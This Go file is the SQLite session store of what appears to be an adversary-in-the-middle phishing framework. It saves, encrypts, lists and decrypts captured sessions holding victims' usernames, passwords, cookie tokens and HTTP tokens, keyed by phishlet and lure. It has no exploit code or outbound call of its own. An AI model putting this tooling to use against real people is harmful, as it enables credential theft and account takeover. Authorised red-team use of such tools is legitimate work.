package sqlite

import (
	"database/sql"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/crypto/aes"
)

// Sessions implements the sessionStore interface defined in the aitm package.
type Sessions struct {
	db     *DB
	cipher *aes.Cipher
}

func NewSessionStore(db *DB, cipher *aes.Cipher) *Sessions {
	return &Sessions{db: db, cipher: cipher}
}

// encryptSensitiveFields encrypts the 7 sensitive session fields for storage.
func (s *Sessions) encryptSensitiveFields(session *aitm.Session, custom, lureParams, cookies, body, httpTok string) (
	eUsername, ePassword, eCustom, eLureParams, eCookies, eBody, eHTTPTok string, err error,
) {
	fields := []struct {
		name  string
		value string
		dest  *string
	}{
		{"username", session.Username, &eUsername},
		{"password", session.Password, &ePassword},
		{"custom", custom, &eCustom},
		{"lure_params", lureParams, &eLureParams},
		{"cookie_tokens", cookies, &eCookies},
		{"body_tokens", body, &eBody},
		{"http_tokens", httpTok, &eHTTPTok},
	}
	for _, f := range fields {
		*f.dest, err = s.cipher.EncryptString(f.value)
		if err != nil {
			return "", "", "", "", "", "", "", fmt.Errorf("encrypting %s for session %s: %w", f.name, session.ID, err)
		}
	}
	return
}

// decryptSensitiveFields decrypts the 7 sensitive session fields after reading from storage.
func (s *Sessions) decryptSensitiveFields(session *aitm.Session, custom, lureParams, cookies, body, httpTok string) (
	dCustom, dLureParams, dCookies, dBody, dHTTPTok string, err error,
) {
	fields := []struct {
		name string
		src  string
		dest *string
	}{
		{"username", session.Username, &session.Username},
		{"password", session.Password, &session.Password},
		{"custom", custom, &dCustom},
		{"lure_params", lureParams, &dLureParams},
		{"cookie_tokens", cookies, &dCookies},
		{"body_tokens", body, &dBody},
		{"http_tokens", httpTok, &dHTTPTok},
	}
	for _, f := range fields {
		*f.dest, err = s.cipher.DecryptString(f.src)
		if err != nil {
			return "", "", "", "", "", fmt.Errorf("decrypting %s for session %s: %w", f.name, session.ID, err)
		}
	}
	return
}

func (s *Sessions) CreateSession(session *aitm.Session) error {
	custom, lureParams, cookies, body, httpTok, err := marshalSessionFields(session)
	if err != nil {
		return err
	}

	username, password, custom, lureParams, cookies, body, httpTok, err :=
		s.encryptSensitiveFields(session, custom, lureParams, cookies, body, httpTok)
	if err != nil {
		return err
	}

	var completedAt *int64
	if session.CompletedAt != nil {
		t := session.CompletedAt.Unix()
		completedAt = &t
	}
	_, err = s.db.db.Exec(`
		INSERT INTO sessions
			(id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
			 bot_score, username, password, custom, lure_params, cookie_tokens, body_tokens,
			 http_tokens, puppet_id, started_at, completed_at)
		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
		session.ID, session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent,
		session.JA4Hash, session.BotScore, username, password,
		custom, lureParams, cookies, body, httpTok, session.PuppetID,
		session.StartedAt.Unix(), completedAt,
	)
	if isConflict(err) {
		return aitm.ErrConflict
	}
	return err
}

func (s *Sessions) GetSession(id string) (*aitm.Session, error) {
	row := s.db.db.QueryRow(`SELECT
		id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
		bot_score, username, password, custom, lure_params, cookie_tokens, body_tokens,
		http_tokens, puppet_id, started_at, completed_at
		FROM sessions WHERE id = ?`, id)
	sess, err := s.scanSession(row)
	if errors.Is(err, sql.ErrNoRows) {
		return nil, aitm.ErrNotFound
	}
	return sess, err
}

func (s *Sessions) UpdateSession(session *aitm.Session) error {
	custom, lureParams, cookies, body, httpTok, err := marshalSessionFields(session)
	if err != nil {
		return err
	}

	username, password, custom, lureParams, cookies, body, httpTok, err :=
		s.encryptSensitiveFields(session, custom, lureParams, cookies, body, httpTok)
	if err != nil {
		return err
	}

	var completedAt *int64
	if session.CompletedAt != nil {
		t := session.CompletedAt.Unix()
		completedAt = &t
	}
	res, err := s.db.db.Exec(`
		UPDATE sessions SET
			phishlet=?, lure_id=?, remote_addr=?, user_agent=?, ja4_hash=?,
			bot_score=?, username=?, password=?, custom=?, lure_params=?, cookie_tokens=?,
			body_tokens=?, http_tokens=?, puppet_id=?, started_at=?, completed_at=?
		WHERE id=?`,
		session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent, session.JA4Hash,
		session.BotScore, username, password,
		custom, lureParams, cookies, body, httpTok, session.PuppetID,
		session.StartedAt.Unix(), completedAt, session.ID,
	)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Sessions) DeleteSession(id string) error {
	res, err := s.db.db.Exec(`DELETE FROM sessions WHERE id = ?`, id)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Sessions) ListSessions(f aitm.SessionFilter) ([]*aitm.Session, error) {
	if f.CompletedOnly && f.IncompleteOnly {
		return nil, aitm.ErrInvalidFilter
	}
	clause, args := sessionWhereClause(f)

	q := `SELECT id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
		bot_score, username, password, custom, lure_params, cookie_tokens, body_tokens,
		http_tokens, puppet_id, started_at, completed_at FROM sessions` + clause + " ORDER BY started_at DESC"
	if f.Limit > 0 {
		q += fmt.Sprintf(" LIMIT %d", f.Limit)
	}
	if f.Offset > 0 {
		q += fmt.Sprintf(" OFFSET %d", f.Offset)
	}

	rows, err := s.db.db.Query(q, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []*aitm.Session
	for rows.Next() {
		sess, err := s.scanSession(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, sess)
	}
	return out, rows.Err()
}

func (s *Sessions) CountSessions(f aitm.SessionFilter) (int, error) {
	if f.CompletedOnly && f.IncompleteOnly {
		return 0, aitm.ErrInvalidFilter
	}
	clause, args := sessionWhereClause(f)
	q := "SELECT COUNT(*) FROM sessions" + clause

	var count int
	if err := s.db.db.QueryRow(q, args...).Scan(&count); err != nil {
		return 0, err
	}
	return count, nil
}

// sessionWhereClause returns the full " WHERE ..." suffix (or empty string) for a filter.
func sessionWhereClause(f aitm.SessionFilter) (string, []any) {
	where, args := sessionWhere(f)
	if len(where) == 0 {
		return "", args
	}
	return " WHERE " + strings.Join(where, " AND "), args
}

// sessionWhere builds the WHERE clause predicates and bind args for a SessionFilter.
// All predicates are hardcoded literals with parameterized values — no user input
// is interpolated into the SQL string.
func sessionWhere(f aitm.SessionFilter) ([]string, []any) {
	var where []string
	var args []any

	if f.Phishlet != "" {
		where = append(where, "phishlet = ?")
		args = append(args, f.Phishlet)
	}
	if f.CompletedOnly {
		where = append(where, "completed_at IS NOT NULL")
	}
	if f.IncompleteOnly {
		where = append(where, "completed_at IS NULL")
	}
	if !f.After.IsZero() {
		where = append(where, "started_at > ?")
		args = append(args, f.After.Unix())
	}
	if !f.Before.IsZero() {
		where = append(where, "started_at < ?")
		args = append(args, f.Before.Unix())
	}
	return where, args
}

// scanSession scans a row into a Session, decrypting sensitive fields.
func (s *Sessions) scanSession(row scanner) (*aitm.Session, error) {
	var (
		session     aitm.Session
		startedAt   int64
		completedAt *int64
		custom      string
		lureParams  string
		cookies     string
		body        string
		httpTok     string
	)
	err := row.Scan(
		&session.ID, &session.Phishlet, &session.LureID, &session.RemoteAddr, &session.UserAgent,
		&session.JA4Hash, &session.BotScore, &session.Username, &session.Password,
		&custom, &lureParams, &cookies, &body, &httpTok, &session.PuppetID,
		&startedAt, &completedAt,
	)
	if err != nil {
		return nil, err
	}
	session.StartedAt = time.Unix(startedAt, 0)
	if completedAt != nil {
		t := time.Unix(*completedAt, 0)
		session.CompletedAt = &t
	}

	custom, lureParams, cookies, body, httpTok, err =
		s.decryptSensitiveFields(&session, custom, lureParams, cookies, body, httpTok)
	if err != nil {
		return nil, err
	}

	if err := unmarshalSessionFields(&session, custom, lureParams, cookies, body, httpTok); err != nil {
		return nil, err
	}
	return &session, nil
}

// marshalSessionFields marshals the JSON-serialized fields of a session.
func marshalSessionFields(s *aitm.Session) (custom, lureParams, cookies, body, httpTok string, err error) {
	if custom, err = marshalJSON(s.Custom); err != nil {
		return "", "", "", "", "", fmt.Errorf("marshaling custom fields for session %s: %w", s.ID, err)
	}
	if lureParams, err = marshalJSON(s.LureParams); err != nil {
		return "", "", "", "", "", fmt.Errorf("marshaling lure params for session %s: %w", s.ID, err)
	}
	if cookies, err = marshalJSON(s.CookieTokens); err != nil {
		return "", "", "", "", "", fmt.Errorf("marshaling cookie tokens for session %s: %w", s.ID, err)
	}
	if body, err = marshalJSON(s.BodyTokens); err != nil {
		return "", "", "", "", "", fmt.Errorf("marshaling body tokens for session %s: %w", s.ID, err)
	}
	if httpTok, err = marshalJSON(s.HTTPTokens); err != nil {
		return "", "", "", "", "", fmt.Errorf("marshaling http tokens for session %s: %w", s.ID, err)
	}
	return
}

// unmarshalSessionFields populates the JSON-serialized fields of a session.
func unmarshalSessionFields(s *aitm.Session, custom, lureParams, cookies, body, httpTok string) error {
	if err := unmarshalJSON(custom, &s.Custom); err != nil {
		return fmt.Errorf("unmarshaling custom fields for session %s: %w", s.ID, err)
	}
	if err := unmarshalJSON(lureParams, &s.LureParams); err != nil {
		return fmt.Errorf("unmarshaling lure params for session %s: %w", s.ID, err)
	}
	if err := unmarshalJSON(cookies, &s.CookieTokens); err != nil {
		return fmt.Errorf("unmarshaling cookie tokens for session %s: %w", s.ID, err)
	}
	if err := unmarshalJSON(body, &s.BodyTokens); err != nil {
		return fmt.Errorf("unmarshaling body tokens for session %s: %w", s.ID, err)
	}
	if err := unmarshalJSON(httpTok, &s.HTTPTokens); err != nil {
		return fmt.Errorf("unmarshaling http tokens for session %s: %w", s.ID, err)
	}
	return nil
}
